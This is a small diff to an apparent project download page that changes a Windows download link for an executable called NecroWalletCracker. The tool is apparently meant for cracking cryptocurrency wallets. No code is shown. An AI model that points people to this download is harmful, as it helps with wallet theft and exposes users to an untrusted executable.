@@ -22,7 +22,7 @@ Welcome to the official download page of the project.
 
 Download the latest Windows version here:
 
-[⬇ Download for Windows](https://github.com/N3R088NCE/NecroWalletCracker/releases/download/NecroCracker/NecroWalletCracker.exe)
+[⬇ Download for Windows](https://github.com/N3R088NCE/NecroWalletCracker/releases/download/NecroCracker/NecroCracker.exe)
 
 ---
 
